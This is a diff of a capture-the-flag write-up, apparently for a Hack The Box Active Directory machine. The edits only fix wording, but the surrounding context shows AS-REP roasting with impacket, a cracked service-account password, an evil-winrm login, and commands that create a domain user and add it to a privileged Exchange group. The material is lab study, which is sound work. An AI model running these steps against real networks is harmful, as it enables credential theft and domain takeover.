@@ -133,7 +133,7 @@ rpcclient $> getdompwinfo
 min_password_length: 7
 password_properties: 0x00000000
 ```
-# Check password length for specific user:
+# Check password length for specific users:
 ```bash
 rpcclient $> getusrdompwinfo 0x47f
     &info: struct samr_PwInfo
@@ -152,7 +152,7 @@ $ rpcclient -U "mark%bbb" -c "getusername;quit" 10.10.10.161
 Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
 ```
 
-# Lets use impacket tool- GetNPUsers.py to try get hash for each user.
+# Let's use the impacket tool- GetNPUsers.py to try to get a hash for each user.
 ```bash
 ┌──(singhx㉿kali)-[~]
 └─$ for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
@@ -171,7 +171,7 @@ $krb5asrep$23$svc-alfresco@HTB:4a0f2542a93873e580d17f4057c48801$9db1aaae1388211b
 ```craked - s3rvice```
 
 
-#logged in using evil-winrm
+# Logged in using evil-winrm
 ```bash
 ┌──(singhx㉿kali)-[~]
 └─$ evil-winrm -u svc-alfresco -p  s3rvice -i 10.10.10.161
@@ -192,11 +192,11 @@ $krb5asrep$23$svc-alfresco@HTB:4a0f2542a93873e580d17f4057c48801$9db1aaae1388211b
 # download the .zip file to local machine.
 `download 20230627211635_BloodHound.zip`
 
-# Upload file to bloodhound:
+# Upload file to Bloodhound:
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/430d0c17-6c51-4300-abac-8ffc05d31005)
 
-# In target machine use cmds:
+# In the target machine use cmds:
 ```powershell
 net user boss boss123 /add /domain
 net group "Exchange Windows Permissions" /add boss
